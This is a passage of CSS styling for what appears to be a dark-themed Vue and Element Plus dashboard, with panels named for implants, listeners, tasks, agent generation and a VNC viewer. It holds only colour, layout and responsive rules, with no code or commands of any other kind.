:deep(.el-table__body td) {
  background: transparent !important;
  color: var(--text-white) !important;
  border-bottom: 1px solid var(--border-color) !important;
}

:deep(.el-table__body tr:hover > td) {
  background: var(--primary-black) !important;
}

/* Fix empty state text and styling */
.empty-state {
  background: transparent !important;
  text-align: center;
  padding: 40px 20px;
}

.empty-state h3 {
  color: var(--text-white) !important;
  margin: 20px 0 10px 0;
}

.empty-state p {
  color: var(--text-gray) !important;
  margin: 0;
}

.empty-state .el-icon {
  color: var(--text-gray) !important;
}

/* Fix all Element Plus components that might have white backgrounds */
:deep(.el-tag) {
  background: var(--primary-black) !important;
  color: var(--text-white) !important;
  border-color: var(--border-color) !important;
}

:deep(.el-tag--success) {
  background: #67c23a !important;
  color: var(--text-white) !important;
  border-color: #67c23a !important;
}

:deep(.el-tag--danger) {
  background: #f56c6c !important;
  color: var(--text-white) !important;
  border-color: #f56c6c !important;
}

:deep(.el-tag--warning) {
  background: #e6a23c !important;
  color: var(--text-white) !important;
  border-color: #e6a23c !important;
}

:deep(.el-tag--info) {
  background: #909399 !important;
  color: var(--text-white) !important;
  border-color: #909399 !important;
}

/* Fix any remaining white backgrounds in panels */
.implants-panel *,
.tasks-panel *,
.listeners-panel *,
.agents-panel *,
.overview-panel * {
  background: transparent !important;
}

/* Ensure panel content has proper backgrounds */
.implants-panel > *,
.tasks-panel > *,
.listeners-panel > *,
.agents-panel > *,
.overview-panel > * {
  background: transparent !important;
}

/* Fix any div elements that might have white backgrounds */
.implants-panel div,
.tasks-panel div,
.listeners-panel div,
.agents-panel div,
.overview-panel div {
  background: transparent !important;
}

/* Panel headers */
.panel-header {
  background: transparent !important;
  margin-bottom: 20px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.panel-header h3 {
  color: var(--text-white) !important;
  margin: 0;
  font-size: 20px;
  font-weight: 500;
  text-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
}

.panel-header p {
  color: var(--text-gray) !important;
  margin: 5px 0 0 0;
  font-size: 14px;
  opacity: 0.8;
}

.panel-header .el-button {
  margin-left: 10px;
}

/* Form labels and inputs */
:deep(.el-form-item__label) {
  color: var(--text-white) !important;
}

:deep(.el-input__inner) {
  background: var(--primary-black) !important;
  border-color: var(--border-color) !important;
  color: var(--text-white) !important;
}

:deep(.el-select .el-input__inner) {
  background: var(--primary-black) !important;
  border-color: var(--border-color) !important;
  color: var(--text-white) !important;
}

:deep(.el-textarea__inner) {
  background: var(--primary-black) !important;
  border-color: var(--border-color) !important;
  color: var(--text-white) !important;
}

/* Select dropdowns */
:deep(.el-select-dropdown) {
  background: var(--secondary-black) !important;
  border-color: var(--border-color) !important;
}

:deep(.el-select-dropdown__item) {
  color: var(--text-white) !important;
}

:deep(.el-select-dropdown__item:hover) {
  background: var(--primary-black) !important;
}

:deep(.el-select-dropdown__item.selected) {
  background: var(--primary-color) !important;
  color: var(--text-white) !important;
}

/* Checkboxes */
:deep(.el-checkbox__label) {
  color: var(--text-white) !important;
}

:deep(.el-checkbox__input.is-checked .el-checkbox__inner) {
  background-color: var(--primary-color) !important;
  border-color: var(--primary-color) !important;
}

/* Buttons */
:deep(.el-button) {
  color: var(--text-white) !important;
}

:deep(.el-button--primary) {
  background-color: var(--primary-color) !important;
  border-color: var(--primary-color) !important;
}

:deep(.el-button--success) {
  background-color: #67c23a !important;
  border-color: #67c23a !important;
}

:deep(.el-button--warning) {
  background-color: #e6a23c !important;
  border-color: #e6a23c !important;
}

:deep(.el-button--danger) {
  background-color: #f56c6c !important;
  border-color: #f56c6c !important;
}



/* Tags */
:deep(.el-tag) {
  color: var(--text-white) !important;
}

/* Dialog styling */
:deep(.el-dialog) {
  background: var(--secondary-black) !important;
  border: 1px solid var(--border-color) !important;
}

:deep(.el-dialog__header) {
  background: var(--primary-black) !important;
  border-bottom: 1px solid var(--border-color) !important;
}

:deep(.el-dialog__title) {
  color: var(--text-white) !important;
}

:deep(.el-dialog__body) {
  color: var(--text-white) !important;
}

:deep(.el-dialog__footer) {
  background: var(--primary-black) !important;
  border-top: 1px solid var(--border-color) !important;
}

/* Agents Panel */
.agents-panel {
  padding: 20px;
}

.agents-panel .panel-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
}

.agents-panel .panel-header h3 {
  margin: 0;
  color: var(--text-white);
}

.agents-panel .agent-generator {
  background: var(--secondary-black);
  padding: 20px;
  border-radius: 8px;
  margin-bottom: 20px;
}

.agents-panel .agent-form {
  max-width: 800px;
}

.agents-panel .form-help {
  color: var(--text-gray);
  font-size: 12px;
  margin-left: 8px;
}

.agents-panel .agent-output {
  background: var(--secondary-black);
  padding: 20px;
  border-radius: 8px;
  margin-bottom: 20px;
}

.agents-panel .agent-info {
  margin-bottom: 15px;
}

.agents-panel .agent-info p {
  margin: 5px 0;
  color: var(--text-gray);
}

.agents-panel .code-container {
  margin-top: 15px;
}

.agents-panel .agent-code {
  margin-bottom: 15px;
}

.agents-panel .code-actions {
  display: flex;
  gap: 10px;
  justify-content: center;
}

.agents-panel .agent-history {
  background: var(--secondary-black);
  padding: 20px;
  border-radius: 8px;
}

.agents-panel .agent-history h3 {
  margin: 0 0 15px 0;
  color: var(--text-white);
}

.agents-panel .agent-history-table {
  margin-top: 15px;
}



/* VNC Panel */
.vnc-panel {
  padding: 20px;
}

.vnc-panel .panel-header {
  margin-bottom: 20px;
}

.vnc-panel .panel-header h3 {
  margin: 0 0 10px 0;
  color: var(--text-white);
}

.vnc-panel .panel-header p {
  color: var(--text-gray);
  margin: 0;
}

.vnc-panel .vnc-generator {
  background: var(--secondary-black);
  padding: 20px;
  border-radius: 8px;
  margin-bottom: 20px;
}

.vnc-panel .vnc-form {
  max-width: 800px;
}

.vnc-panel .form-help {
  color: var(--text-gray);
  font-size: 12px;
  margin-left: 8px;
}

.vnc-panel .connection-info {
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid var(--border-color);
  border-radius: 4px;
  padding: 10px;
  
  p {
    margin: 0;
    color: var(--text-white);
    font-family: 'Courier New', monospace;
  }
}

.vnc-panel .vnc-output {
  background: var(--secondary-black);
  padding: 20px;
  border-radius: 8px;
  margin-bottom: 20px;
}

.vnc-panel .vnc-info {
  margin-bottom: 15px;
}

.vnc-panel .vnc-info p {
  margin: 5px 0;
  color: var(--text-gray);
}

.vnc-panel .vnc-code {
  font-family: 'Courier New', monospace;
  background: var(--primary-black);
  border: 1px solid var(--border-color);
}

.vnc-panel .code-actions {
  margin-top: 15px;
  display: flex;
  gap: 10px;
}

.vnc-panel .vnc-history {
  background: var(--secondary-black);
  padding: 20px;
  border-radius: 8px;
}

.vnc-panel .vnc-history h3 {
  margin: 0 0 15px 0;
  color: var(--text-white);
}

.vnc-panel .vnc-history-table {
  margin-top: 15px;
}

/* VNC Viewer & Control Styles */
.vnc-viewer {
  margin-top: 30px;
  padding: 20px;
  background: var(--secondary-black);
  border-radius: 8px;
}

.vnc-viewer h3 {
  margin: 0 0 10px 0;
  color: var(--text-white);
}

.vnc-viewer p {
  color: var(--text-gray);
  margin: 0 0 20px 0;
}

.vnc-status {
  margin-bottom: 20px;
}

.status-indicator {
  display: flex;
  align-items: center;
  margin-bottom: 15px;
}

.status-dot {
  width: 12px;
  height: 12px;
  border-radius: 50%;
  background: #f56c6c;
  margin-right: 10px;
}

.status-dot.active {
  background: #67c23a;
}

.status-text {
  color: var(--text-white);
  font-weight: 500;
}

.connection-info {
  background: var(--primary-black);
  padding: 15px;
  border-radius: 6px;
}

.connection-info p {
  margin: 5px 0;
  color: var(--text-gray);
}

.vnc-controls {
  margin-bottom: 20px;
}

.control-buttons {
  display: flex;
  gap: 10px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}

.vnc-settings {
  background: var(--primary-black);
  padding: 15px;
  border-radius: 6px;
}

.vnc-display {
  position: relative;
  margin-bottom: 20px;
}

.vnc-canvas {
  width: 100%;
  max-width: 800px;
  height: auto;
  border: 2px solid var(--border-color);
  border-radius: 6px;
  background: #000;
}

.vnc-overlay {
  position: absolute;
  top: 10px;
  right: 10px;
  background: rgba(0, 0, 0, 0.7);
  padding: 8px 12px;
  border-radius: 4px;
}

.overlay-info {
  display: flex;
  gap: 15px;
  color: white;
  font-size: 12px;
}

.vnc-waiting {
  text-align: center;
  padding: 40px;
}

/* Responsive design for agents panel */
@media (max-width: 768px) {
  .agents-panel {
    padding: 15px;
  }
  
  .agents-panel .panel-header {
    flex-direction: column;
    gap: 15px;
    align-items: stretch;
  }
  
  .agents-panel .agent-form .el-row .el-col {
    margin-bottom: 15px;
  }
  
  .agents-panel .code-actions {
    flex-direction: column;
    align-items: stretch;
  }
}
</style>
